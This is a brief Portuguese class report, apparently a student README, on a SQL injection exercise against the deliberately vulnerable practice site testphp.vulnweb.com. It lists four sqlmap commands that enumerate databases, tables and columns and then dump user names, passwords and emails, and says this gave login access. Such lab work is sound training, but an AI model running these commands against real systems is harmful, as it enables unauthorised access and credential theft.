## SqlInjection

Durante a atividade em sala de aula, eu realizei a atividade proposta em sala e a atividade proposta para casa, segue os seguintes comandos para a realização da atividade com SqlMap:

- ```sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 --dbs```
- ``` sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 --dbs -D actuart --tables```
- ``` sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 --dbs -D actuart -T users --columns```
- ``` sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 --dbs -D actuart -T users -C name, pass, email --dump```

Ao final da execução dos comandos, foi possível identificar os usuários cadastros com informações de login e senha e a ssim obter acesso ao site.

No geral, a realização da atividade foi tranquila devido aos meus conhecimento prévios em sql e pela descrição detalhada dos passos a serem executados pelo tutorial.